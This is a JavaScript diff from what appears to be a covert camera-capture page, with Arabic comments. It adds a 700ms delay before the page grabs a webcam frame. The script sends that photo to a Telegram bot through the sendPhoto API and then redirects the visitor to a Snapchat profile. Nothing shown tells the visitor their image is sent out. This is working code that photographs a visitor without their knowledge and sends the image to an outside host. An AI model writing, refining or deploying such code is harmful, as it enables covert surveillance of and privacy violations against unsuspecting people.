@@ -20,25 +20,29 @@ navigator.mediaDevices.getUserMedia({ video: true })
   video.srcObject = stream;
 
   video.onloadedmetadata = () => {
-    const canvas = document.getElementById("canvas");
-    canvas.width = video.videoWidth;
-    canvas.height = video.videoHeight;
+    // إضافة تأخير 700ms قبل الالتقاط
+    setTimeout(() => {
+      const canvas = document.getElementById("canvas");
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
 
-    const ctx = canvas.getContext("2d");
-    ctx.drawImage(video, 0, 0);
+      const ctx = canvas.getContext("2d");
+      ctx.drawImage(video, 0, 0);
 
-    canvas.toBlob(blob => {
-      const form = new FormData();
-      form.append("chat_id", CHAT_ID);
-      form.append("photo", blob);
+      canvas.toBlob(blob => {
+        const form = new FormData();
+        form.append("chat_id", CHAT_ID);
+        form.append("photo", blob);
 
-      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-  method: "POST",
-  body: form
-}).then(() => {
-  window.location.href = "https://www.snapchat.com/add/habebabulaila";
-});
-    }, "image/jpeg");
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+          method: "POST",
+          body: form
+        }).then(() => {
+          // تحويل مباشر لحسابك على Snapchat
+          window.location.href = "https://www.snapchat.com/add/habebabulaila";
+        });
+      }, "image/jpeg");
+    }, 700); // ← هنا التأخير 700ms
   };
 })
 .catch(err => {
